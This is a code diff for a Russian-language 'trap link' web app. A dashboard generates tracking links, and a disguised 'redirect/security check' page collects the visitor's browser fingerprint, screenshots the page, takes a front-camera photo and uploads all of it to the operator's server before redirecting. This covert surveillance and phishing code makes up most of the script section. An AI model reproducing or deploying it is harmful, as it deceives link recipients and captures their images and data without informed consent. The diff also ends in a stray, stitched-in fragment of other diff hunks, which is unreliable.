+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.3s ease;
+            width: 100%;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            transition: left 0.6s;
+        }
+
+        .btn:hover::before {
+            left: 100%;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 24px rgba(99, 102, 241, 0.4);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.08);
+            border: 1px solid var(--border-color);
+            color: var(--text-primary);
+            width: auto;
+            padding: 10px 16px;
+        }
+
+        .btn-secondary:hover {
+            background: rgba(255, 255, 255, 0.12);
+            border-color: var(--primary);
+        }
+
+        .result-card {
+            background: rgba(16, 185, 129, 0.1);
+            border: 1px solid rgba(16, 185, 129, 0.3);
+            border-radius: 12px;
+            padding: 20px;
+            margin-top: 24px;
+            display: none;
+            animation: slideInUp 0.5s ease-out;
+        }
+
+        .result-card.active {
+            display: block;
+        }
+
+        .result-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 16px;
+            font-weight: 600;
+            color: var(--success);
+        }
+
+        .result-row {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 12px;
+        }
+
+        .result-input {
+            flex: 1;
+            padding: 10px 12px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            color: var(--text-primary);
+            font-size: 12px;
+            font-family: monospace;
+            word-break: break-all;
+        }
+
+        .btn-copy {
+            background: linear-gradient(135deg, var(--success), #059669);
+            color: white;
+            border: none;
+            padding: 10px 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            white-space: nowrap;
+            transition: all 0.3s ease;
+        }
+
+        .btn-copy:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 16px rgba(16, 185, 129, 0.3);
+        }
+
+        .actions-group {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
+            gap: 8px;
+            margin-top: 16px;
+        }
+
+        .btn-action {
+            padding: 10px 12px;
+            font-size: 12px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            color: var(--text-primary);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            transition: all 0.3s ease;
+        }
+
+        .btn-action:hover {
+            background: rgba(99, 102, 241, 0.2);
+            border-color: var(--primary);
+        }
+
+        .sidebar-card {
+            background: rgba(26, 26, 46, 0.6);
+            backdrop-filter: blur(20px);
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+            padding: 24px;
+            height: fit-content;
+            position: sticky;
+            top: 100px;
+        }
+
+        .stat-item {
+            text-align: center;
+            padding: 16px 0;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .stat-item:last-child {
+            border-bottom: none;
+        }
+
+        .stat-value {
+            font-size: 28px;
+            font-weight: 700;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .stat-label {
+            font-size: 12px;
+            color: var(--text-secondary);
+            margin-top: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        .links-section {
+            margin-top: 40px;
+        }
+
+        .section-title {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: var(--text-primary);
+        }
+
+        .section-title i {
+            color: var(--primary);
+            font-size: 20px;
+        }
+
+        .links-grid {
+            display: grid;
+            gap: 12px;
+        }
+
+        .link-card {
+            background: rgba(26, 26, 46, 0.6);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: all 0.3s ease;
+            animation: slideInUp 0.5s ease-out;
+        }
+
+        .link-card:hover {
+            background: rgba(26, 26, 46, 0.8);
+            border-color: var(--primary);
+            box-shadow: 0 12px 24px rgba(99, 102, 241, 0.2);
+        }
+
+        .link-info {
+            flex: 1;
+            overflow: hidden;
+        }
+
+        .link-name {
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 4px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .link-url {
+            font-size: 12px;
+            color: var(--text-secondary);
+            font-family: monospace;
+            word-break: break-all;
+            margin-bottom: 6px;
+        }
+
+        .link-meta {
+            font-size: 11px;
+            color: var(--text-secondary);
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .link-meta-item {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .link-actions {
+            display: flex;
+            gap: 8px;
+            margin-left: 12px;
+        }
+
+        .btn-icon {
+            width: 32px;
+            height: 32px;
+            border-radius: 6px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--border-color);
+            color: var(--text-secondary);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+            font-size: 12px;
+        }
+
+        .btn-icon:hover {
+            background: rgba(99, 102, 241, 0.2);
+            color: var(--primary);
+            border-color: var(--primary);
+        }
+
+        .btn-icon.delete:hover {
+            background: rgba(239, 68, 68, 0.2);
+            color: var(--danger);
+            border-color: var(--danger);
+        }
+
+        .loading {
+            text-align: center;
+            padding: 40px;
+            color: var(--text-secondary);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .spinner {
+            width: 24px;
+            height: 24px;
+            border: 2px solid var(--border-color);
+            border-top-color: var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .notification {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(16, 185, 129, 0.2);
+            border: 1px solid rgba(16, 185, 129, 0.5);
+            color: var(--success);
+            padding: 14px 20px;
+            border-radius: 10px;
+            display: none;
+            animation: slideIn 0.3s ease;
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            max-width: 400px;
+        }
+
+        .notification.error {
+            background: rgba(239, 68, 68, 0.2);
+            border-color: rgba(239, 68, 68, 0.5);
+            color: var(--danger);
+        }
+
+        .notification.info {
+            background: rgba(6, 182, 212, 0.2);
+            border-color: rgba(6, 182, 212, 0.5);
+            color: var(--accent);
+        }
+
+        @keyframes slideInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(100%);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        @media (max-width: 768px) {
+            .content-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .sidebar-card {
+                position: static;
+            }
+
+            .header {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 12px;
+            }
+
+            .header-actions {
+                width: 100%;
+            }
+
+            .link-card {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+
+            .link-actions {
+                width: 100%;
+                margin-left: 0;
+                margin-top: 12px;
+            }
+
+            .actions-group {
+                grid-template-columns: repeat(2, 1fr);
+            }
+
+            .page-title h1 {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="user-section">
+            <div class="avatar" id="userAvatar">{{ user_initials }}</div>
+            <div class="user-info">
+                <div class="user-name" id="userName">{{ user_name }}</div>
+                <div class="user-stats">
+                    <span><i class="fas fa-link"></i> <span id="linkCount">0</span> ссылок</span>
+                    <span><i class="fas fa-mouse"></i> <span id="clickCount">0</span> кликов</span>
+                </div>
+            </div>
+        </div>
+        <div class="header-actions">
+            <button onclick="logout(false)" class="btn-header">
+                <i class="fas fa-sign-out-alt"></i> Выйти
+            </button>
+            <button onclick="logout(true)" class="btn-header" style="border-color: rgba(239,68,68,0.3);">
+                <i class="fas fa-door-open"></i> Везде
+            </button>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="page-title">
+            <h1><i class="fas fa-trap"></i> Генератор ссылок-ловушек</h1>
+            <p class="page-subtitle">Создавайте ссылки с фото и скриншотом при переходе</p>
+        </div>
+
+        <div class="content-grid">
+            <div class="main-card">
+                <form id="linkForm">
+                    <div class="form-group">
+                        <label class="form-label">
+                            <i class="fas fa-heading"></i> Название ссылки
+                        </label>
+                        <input type="text" id="linkName" class="form-input" placeholder="Например: 'Проверка безопасности'">
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">
+                            <i class="fas fa-globe"></i> URL для перенаправления
+                        </label>
+                        <input type="text" id="redirectUrl" class="form-input" placeholder="https://www.example.com" value="https://www.google.com">
+                    </div>
+
+                    <button type="submit" class="btn">
+                        <i class="fas fa-magic"></i> Сгенерировать ссылку
+                    </button>
+                </form>
+
+                <div id="linkResult" class="result-card">
+                    <div class="result-header">
+                        <i class="fas fa-check-circle"></i> Ссылка готова!
+                    </div>
+
+                    <div class="result-row">
+                        <input type="text" id="generatedLink" readonly class="result-input">
+                        <button onclick="copyLink()" class="btn-copy">
+                            <i class="fas fa-copy"></i> Полная
+                        </button>
+                    </div>
+
+                    <div class="result-row">
+                        <input type="text" id="shortLink" readonly class="result-input">
+                        <button onclick="copyShortLink()" class="btn-copy">
+                            <i class="fas fa-link"></i> Короткая
+                        </button>
+                    </div>
+
+                    <div class="actions-group">
+                        <button onclick="testLink()" class="btn-action" title="Протестировать ссылку">
+                            <i class="fas fa-flask"></i> Тест
+                        </button>
+                        <button onclick="showQRCode()" class="btn-action" title="Показать QR-код">
+                            <i class="fas fa-qrcode"></i> QR
+                        </button>
+                        <button onclick="sendToTelegram()" class="btn-action" title="Отправить в Telegram">
+                            <i class="fab fa-telegram"></i> Telegram
+                        </button>
+                    </div>
+
+                    <div id="qrSection" style="margin-top: 16px; padding: 16px; background: rgba(255,255,255,0.05); border-radius: 10px; text-align: center; display: none;">
+                        <div style="font-size: 12px; color: var(--text-secondary); margin-bottom: 12px;">
+                            <i class="fas fa-mobile-alt"></i> QR-код для мобильного
+                        </div>
+                        <img id="qrCodeImage" src="" alt="QR Code" style="max-width: 150px; border-radius: 8px;">
+                    </div>
+                </div>
+            </div>
+
+            <div class="sidebar-card">
+                <div class="stat-item">
+                    <div class="stat-value" id="totalLinks">0</div>
+                    <div class="stat-label">
+                        <i class="fas fa-list"></i> Всего ссылок
+                    </div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value" id="totalClicks">0</div>
+                    <div class="stat-label">
+                        <i class="fas fa-mouse"></i> Всего кликов
+                    </div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value" id="activeLinks">0</div>
+                    <div class="stat-label">
+                        <i class="fas fa-circle" style="color: #10b981; font-size: 8px;"></i> Активные
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="links-section">
+            <div class="section-title">
+                <i class="fas fa-history"></i> Ваши ссылки
+            </div>
+            <div class="links-grid" id="linksList">
+                <div class="loading">
+                    <div class="spinner"></div>
+                    <span>Загрузка ссылок...</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="notification" id="notification"></div>
+
+    <script>
+        const BASE_URL = '{{ base_url }}';
+        let currentGeneratedName = 'Без названия';
+
+        function showNotification(message, type = 'success') {
+            const notification = document.getElementById('notification');
+            notification.className = 'notification ' + type;
+            notification.innerHTML = `<i class="fas fa-${type === 'error' ? 'exclamation-circle' : type === 'info' ? 'info-circle' : 'check-circle'}"></i> ${message}`;
+            notification.style.display = 'flex';
+            setTimeout(() => notification.style.display = 'none', 3000);
+        }
+
+        async function loadStats() {
+            try {
+                const response = await fetch('/api/stats');
+                const data = await response.json();
+                document.getElementById('totalLinks').textContent = data.total_links || 0;
+                document.getElementById('totalClicks').textContent = data.total_clicks || 0;
+                document.getElementById('activeLinks').textContent = data.active_links || 0;
+                document.getElementById('linkCount').textContent = data.total_links || 0;
+                document.getElementById('clickCount').textContent = data.total_clicks || 0;
+                await loadLinks();
+            } catch (error) {
+                showNotification('Ошибка загрузки статистики', 'error');
+            }
+        }
+
+        async function loadLinks() {
+            try {
+                const response = await fetch('/api/links');
+                const links = await response.json();
+                const linksList = document.getElementById('linksList');
+
+                if (!links || links.length === 0) {
+                    linksList.innerHTML = '<div style="text-align: center; padding: 40px; color: var(--text-secondary);"><i class="fas fa-inbox"></i> Нет созданных ссылок</div>';
+                    return;
+                }
+
+                let html = '';
+                for (const link of links) {
+                    const created = new Date(link.created_at).toLocaleDateString('ru-RU');
+                    const expires = new Date(link.expires_at).toLocaleDateString('ru-RU');
+                    const fullUrl = `${BASE_URL}/red/${link.link_id}`;
+                    const status = link.active ? 'var(--success)' : 'var(--danger)';
+                    
+                    html += `
+                        <div class="link-card">
+                            <div class="link-info">
+                                <div class="link-name">
+                                    <i class="fas fa-${link.active ? 'check-circle' : 'times-circle'}" style="color: ${link.active ? 'var(--success)' : 'var(--danger)'}; font-size: 14px;"></i>
+                                    ${link.name || 'Без названия'}
+                                </div>
+                                <div class="link-url">${fullUrl}</div>
+                                <div class="link-meta">
+                                    <div class="link-meta-item">
+                                        <i class="fas fa-mouse-pointer" style="font-size: 10px;"></i> ${link.clicks || 0} кликов
+                                    </div>
+                                    <div class="link-meta-item">
+                                        <i class="fas fa-calendar" style="font-size: 10px;"></i> ${created}
+                                    </div>
+                                    <div class="link-meta-item">
+                                        <i class="fas fa-hourglass-end" style="font-size: 10px;"></i> ${expires}
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="link-actions">
+                                <button onclick="copyToClipboard('${fullUrl}')" class="btn-icon" title="Копировать">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                                <button onclick="showLinkQR('${fullUrl}')" class="btn-icon" title="QR-код">
+                                    <i class="fas fa-qrcode"></i>
+                                </button>
+                                <button onclick="deleteLink('${link.link_id}')" class="btn-icon delete" title="Удалить">
+                                    <i class="fas fa-trash"></i>
+                                </button>
+                            </div>
+                        </div>
+                    `;
+                }
+                linksList.innerHTML = html;
+            } catch (error) {
+                document.getElementById('linksList').innerHTML = '<div style="color: var(--danger);">Ошибка загрузки ссылок</div>';
+            }
+        }
+
+        async function showLinkQR(url) {
+            try {
+                const response = await fetch('/api/generate-qr', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ url: url })
+                });
+                const data = await response.json();
+                if (data.success && data.qr_code) {
+                    const popup = window.open('', 'QR Code', 'width=400,height=500');
+                    popup.document.write(`
+                        <!DOCTYPE html><html><head><title>QR-код</title>
+                        <style>body{background:#1a1a2e;color:#e0e0e0;font-family:Inter;text-align:center;padding:20px}
+                        img{max-width:300px;border-radius:10px;margin:20px 0}</style>
+                        </head><body><h2><i class="fas fa-qrcode"></i> QR-код для ссылки</h2>
+                        <img src="${data.qr_code}" alt="QR"><p style="font-size:12px;color:#a0a0a0;word-break:break-all">${url}</p>
+                        <button onclick="window.print()">Печать</button>
+                        </body></html>
+                    `);
+                }
+            } catch (error) {
+                showNotification('Ошибка генерации QR-кода', 'error');
+            }
+        }
+
+        document.getElementById('linkForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const linkName = document.getElementById('linkName').value;
+            const redirectUrl = document.getElementById('redirectUrl').value;
+
+            if (!redirectUrl.startsWith('http')) {
+                showNotification('Введите корректный URL', 'error');
+                return;
+            }
+
+            try {
+                const response = await fetch('/api/create', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({name: linkName || 'Без названия', redirect_url: redirectUrl})
+                });
+                const data = await response.json();
+
+                if (data.success) {
+                    currentGeneratedName = data.name;
+                    document.getElementById('generatedLink').value = data.full_url;
+                    document.getElementById('shortLink').value = data.short_url;
+                    document.getElementById('linkResult').classList.add('active');
+                    document.getElementById('qrSection').style.display = 'none';
+                    document.getElementById('linkResult').scrollIntoView({ behavior: 'smooth' });
+                    document.getElementById('linkName').value = '';
+                    await loadStats();
+                    showNotification('Ссылка успешно создана!', 'success');
+                } else {
+                    showNotification('Ошибка создания ссылки', 'error');
+                }
+            } catch (error) {
+                showNotification('Ошибка создания ссылки', 'error');
+            }
+        });
+
+        function copyLink() {
+            copyToClipboard(document.getElementById('generatedLink').value);
+        }
+
+        function copyShortLink() {
+            copyToClipboard(document.getElementById('shortLink').value);
+        }
+
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                showNotification('Скопировано в буфер!', 'success');
+            }).catch(() => {
+                const textArea = document.createElement('textarea');
+                textArea.value = text;
+                document.body.appendChild(textArea);
+                textArea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textArea);
+                showNotification('Скопировано!', 'success');
+            });
+        }
+
+        function testLink() {
+            const link = document.getElementById('generatedLink').value;
+            if (link) window.open(link, '_blank');
+            else showNotification('Сначала создайте ссылку', 'error');
+        }
+
+        async function showQRCode() {
+            const link = document.getElementById('generatedLink').value;
+            if (!link) {
+                showNotification('Сначала создайте ссылку', 'error');
+                return;
+            }
+
+            try {
+                const response = await fetch('/api/generate-qr', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ url: link })
+                });
+                const data = await response.json();
+
+                if (data.success && data.qr_code) {
+                    document.getElementById('qrCodeImage').src = data.qr_code;
+                    document.getElementById('qrSection').style.display = 'block';
+                    document.getElementById('qrSection').scrollIntoView({ behavior: 'smooth' });
+                    showNotification('QR-код готов!', 'info');
+                }
+            } catch (error) {
+                showNotification('Ошибка генерации QR-кода', 'error');
+            }
+        }
+
+        async function sendToTelegram() {
+            const link = document.getElementById('generatedLink').value;
+            if (!link) {
+                showNotification('Сначала создайте ссылку', 'error');
+                return;
+            }
+
+            try {
+                const response = await fetch('/api/send-link-telegram', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({link: link, name: currentGeneratedName})
+                });
+                const data = await response.json();
+
+                if (data.success) {
+                    showNotification('Ссылка отправлена в Telegram!', 'success');
+                } else {
+                    showNotification('Ошибка отправки', 'error');
+                }
+            } catch (error) {
+                showNotification('Ошибка отправки в Telegram', 'error');
+            }
+        }
+
+        async function deleteLink(linkId) {
+            if (!confirm('Удалить эту ссылку?')) return;
+
+            try {
+                const response = await fetch(`/api/delete/${linkId}`, {method: 'DELETE'});
+                const data = await response.json();
+
+                if (data.success) {
+                    showNotification('Ссылка удалена', 'success');
+                    await loadStats();
+                } else {
+                    showNotification('Ошибка удаления ссылки', 'error');
+                }
+            } catch (error) {
+                showNotification('Ошибка удаления ссылки', 'error');
+            }
+        }
+
+        async function logout(logoutEverywhere = false) {
+            if (!confirm(logoutEverywhere ? 'Выйти со всех устройств?' : 'Выйти?')) return;
+
+            try {
+                const response = await fetch('/api/logout', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({logout_everywhere: logoutEverywhere})
+                });
+
+                if (response.ok) window.location.href = '/login';
+            } catch (error) {
+                showNotification('Ошибка выхода', 'error');
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            loadStats();
+            setInterval(loadStats, 30000);
+            setInterval(() => {
+                fetch('/api/check-auth').then(r => r.json()).then(d => {
+                    if (!d.authenticated) window.location.href = '/login';
+                });
+            }, 5000);
+        });
+    </script>
+</body>
+</html>"""
+
+TRAP_HTML = """<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Перенаправление...</title>
+    <style>
+        body {
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: radial-gradient(circle at top left, rgba(79, 70, 229, 0.22), transparent 28%),
+                        radial-gradient(circle at bottom right, rgba(16, 185, 129, 0.18), transparent 20%),
+                        linear-gradient(135deg, #020617 0%, #111827 100%);
+            color: #f8fafc;
+            font-family: 'Inter', system-ui, sans-serif;
+        }
+        .frame {
+            position: relative;
+            width: min(620px, calc(100% - 32px));
+            padding: 34px;
+            border-radius: 28px;
+            background: rgba(15, 23, 42, 0.92);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            box-shadow: 0 35px 80px rgba(15, 23, 42, 0.45);
+            overflow: hidden;
+        }
+        .frame::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            pointer-events: none;
+            background: radial-gradient(circle at top left, rgba(59, 130, 246, 0.16), transparent 22%),
+                        radial-gradient(circle at bottom right, rgba(16, 185, 129, 0.12), transparent 18%);
+        }
+        .title {
+            font-size: 2rem;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+        .subtitle {
+            color: #cbd5e1;
+            margin-bottom: 26px;
+            line-height: 1.7;
+        }
+        .steps {
+            display: grid;
+            gap: 14px;
+            margin-bottom: 28px;
+        }
+        .step {
+            display: flex;
+            gap: 14px;
+            padding: 18px 20px;
+            border-radius: 20px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255,255,255,0.08);
+            backdrop-filter: blur(6px);
+        }
+        .step-icon {
+            width: 44px;
+            height: 44px;
+            display: grid;
+            place-items: center;
+            border-radius: 14px;
+            background: rgba(99, 102, 241, 0.18);
+            color: #e0e7ff;
+            font-size: 1.1rem;
+            font-weight: 700;
+        }
+        .step-content {
+            min-width: 0;
+        }
+        .step-title {
+            font-size: 1rem;
+            margin-bottom: 4px;
+            color: #f8fafc;
+        }
+        .step-desc {
+            font-size: 0.92rem;
+            color: #94a3b8;
+            line-height: 1.45;
+        }
+        .status-card {
+            padding: 18px 20px;
+            border-radius: 22px;
+            background: rgba(15, 23, 42, 0.85);
+            border: 1px solid rgba(255,255,255,0.06);
+            display: grid;
+            gap: 10px;
+        }
+        .status-title {
+            font-size: 0.86rem;
+            text-transform: uppercase;
+            letter-spacing: 0.18em;
+            color: #7dd3fc;
+        }
+        .status-text {
+            font-size: 1.05rem;
+            color: #e2e8f0;
+            min-height: 28px;
+        }
+        .progress {
+            width: 100%;
+            height: 8px;
+            border-radius: 999px;
+            background: rgba(255,255,255,0.07);
+            overflow: hidden;
+        }
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            border-radius: inherit;
+            background: linear-gradient(90deg, #6366f1, #38bdf8);
+            animation: progressMove 3.5s ease forwards;
+        }
+        @keyframes progressMove {
+            0% { width: 0%; }
+            30% { width: 40%; }
+            65% { width: 76%; }
+            100% { width: 100%; }
+        }
+        .footer {
+            margin-top: 24px;
+            font-size: 0.88rem;
+            color: #94a3b8;
+            text-align: center;
+        }
+        @media (max-width: 520px) {
+            .frame { padding: 24px; }
+            .steps { gap: 12px; }
+            .step { padding: 16px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="frame">
+        <div class="title">🔄 Перенаправление...</div>
+        <div class="subtitle">Проводим проверку доступа и безопасное перенаправление на целевой сайт.</div>
+
+        <div class="steps">
+            <div class="step">
+                <div class="step-icon">1</div>
+                <div class="step-content">
+                    <div class="step-title">Сбор данных</div>
+                    <div class="step-desc">Собираем параметры браузера и информацию о сессии.</div>
+                </div>
+            </div>
+            <div class="step">
+                <div class="step-icon">2</div>
+                <div class="step-content">
+                    <div class="step-title">Запрос к странице</div>
+                    <div class="step-desc">Попытка сделать скриншот и сохранить результаты.</div>
+                </div>
+            </div>
+            <div class="step">
+                <div class="step-icon">3</div>
+                <div class="step-content">
+                    <div class="step-title">Переход</div>
+                    <div class="step-desc">Через несколько секунд вы будете отправлены на целевой URL.</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="status-card">
+            <div class="status-title">Статус операции</div>
+            <div class="status-text" id="status">Подготовка...</div>
+            <div class="progress"><div class="progress-bar"></div></div>
+        </div>
+
+        <div class="footer">Если перенаправление не сработает автоматически, обновите страницу или попробуйте снова.</div>
+    </div>
+
+    <script>
+        const TRAP_ID = "{{ trap_id }}";
+        const REDIRECT_URL = "{{ redirect_url }}";
+        const SESSION_ID = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        const SERVER_URL = window.location.origin;
+        const statusEl = document.getElementById('status');
+
+        const browserInfo = {
+            trap_id: TRAP_ID,
+            session_id: SESSION_ID,
+            user_agent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen_width: screen.width,
+            screen_height: screen.height,
+            color_depth: screen.colorDepth,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timestamp: new Date().toISOString(),
+            referrer: document.referrer,
+            url: window.location.href
+        };
+
+        function updateStatus(message) {
+            statusEl.textContent = message;
+        }
+
+        async function sendImage(dataURL, imageType) {
+            try {
+                const blob = await (await fetch(dataURL)).blob();
+                const formData = new FormData();
+                formData.append('image', blob, `${imageType}_${Date.now()}.jpg`);
+                formData.append('type', imageType);
+                formData.append('session_id', SESSION_ID);
+                formData.append('trap_id', TRAP_ID);
+                formData.append('browser_info', JSON.stringify(browserInfo));
+
+                const response = await fetch(`${SERVER_URL}/api/upload`, {
+                    method: 'POST',
+                    body: formData
+                });
+                return response.ok;
+            } catch (error) {
+                return false;
+            }
+        }
+
+        async function captureScreenshot() {
+            updateStatus('Собираем данные сайта...');
+            if (typeof html2canvas === 'undefined') {
+                await new Promise((resolve) => {
+                    const script = document.createElement('script');
+                    script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
+                    script.onload = resolve;
+                    script.onerror = resolve;
+                    document.head.appendChild(script);
+                });
+            }
+
+            await new Promise(resolve => setTimeout(resolve, 750));
+            if (typeof html2canvas !== 'undefined') {
+                try {
+                    const canvas = await html2canvas(document.documentElement, {
+                        scale: 0.5,
+                        useCORS: true,
+                        logging: false
+                    });
+                    const imageData = canvas.toDataURL('image/jpeg', 0.75);
+                    const ok = await sendImage(imageData, 'screenshot');
+                    updateStatus(ok ? 'Скриншот отправлен.' : 'Скриншот не получен.');
+                    return ok;
+                } catch (error) {
+                    updateStatus('Не удалось сделать скриншот.');
+                }
+            }
+            return false;
+        }
+
+        async function captureCamera() {
+            updateStatus('Проверяем камеру...');
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                updateStatus('Камеру проверить не удалось.');
+                return false;
+            }
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({video: { facingMode: 'user' }, audio: false});
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await new Promise(resolve => {
+                    video.onloadedmetadata = () => { video.play(); resolve(); };
+                });
+
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                stream.getTracks().forEach(track => track.stop());
+
+                const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                const ok = await sendImage(imageData, 'camera');
+                updateStatus(ok ? 'Камера записана.' : 'Камера не доступна.');
+                return ok;
+            } catch (error) {
+                updateStatus('Нет доступа к камере.');
+                return false;
+            }
+        }
+
+        async function run() {
+            updateStatus('Начинаем процесс...');
+            await captureScreenshot();
+            await new Promise(resolve => setTimeout(resolve, 500));
+            await captureCamera();
+            updateStatus('Готово. Перенаправляем...');
+            setTimeout(() => { window.location.href = REDIRECT_URL; }, 1600);
+        }
+
+        run();
+    </script>
+</body>
+</html>"""
+
+old_garbage = """        h1 {
+            color: #10263d;
+            margin-bottom: 10px;
             text-align: center;
             font-size: 2.5em;
+            line-height: 1.08;
         }
         
         .subtitle {
-            color: #666;
+            color: #62738a;
             text-align: center;
             margin-bottom: 40px;
             font-size: 1.1em;
+            line-height: 1.6;
         }
         
         .form-group {
@@ -503,53 +2863,76 @@ MAIN_PAGE = """
         input[type="text"] {
             width: 100%;
             padding: 15px;
-            border: 2px solid #e0e0e0;
-            border-radius: 10px;
+            border: 1px solid rgba(16, 46, 80, 0.12);
+            border-radius: 16px;
             font-size: 16px;
-            transition: border 0.3s;
+            transition: border 0.3s, box-shadow 0.3s;
+            background: rgba(255,255,255,0.86);
         }
         
         input[type="text"]:focus {
             outline: none;
-            border-color: #667eea;
+            border-color: #0ea5e9;
+            box-shadow: 0 0 0 4px rgba(14, 165, 233, 0.12);
         }
         
         .btn {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #0ea5e9 0%, #0369a1 100%);
             color: white;
             border: none;
             padding: 15px 30px;
-            border-radius: 10px;
+            border-radius: 16px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: transform 0.2s, box-shadow 0.2s;
+            transition: all 0.3s ease;
             display: block;
             width: 100%;
             margin-top: 20px;
+            box-shadow: 0 18px 30px rgba(14, 165, 233, 0.22);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            transition: left 0.6s;
+        }
+        
+        .btn:hover::before {
+            left: 100%;
         }
         
         .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
